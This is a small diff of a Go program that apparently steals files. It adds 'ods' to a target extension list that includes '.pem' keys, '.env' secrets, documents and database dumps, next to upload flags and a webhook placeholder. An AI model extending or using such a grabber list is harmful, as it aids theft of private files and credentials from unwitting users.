@@ -25,7 +25,7 @@ var (
 
 var CurrentUsername string
 var args = []string{"--upload", "--no-upload"} // Arguments
-var extensions = []string{"docx", "doc", "pdf", "xls", "txt", "py", "xml", "json", ".pem", ".env", "php", "yaml", "yml", "csv", "sql", "ost", "ppt", "pptx", "pps"}
+var extensions = []string{"docx", "doc", "pdf", "xls", "txt", "py", "xml", "json", ".pem", ".env", "php", "yaml", "yml", "csv", "sql", "ost", "ppt", "pptx", "pps", "ods"}
 
 var webhook = "WEBHOOK"
 
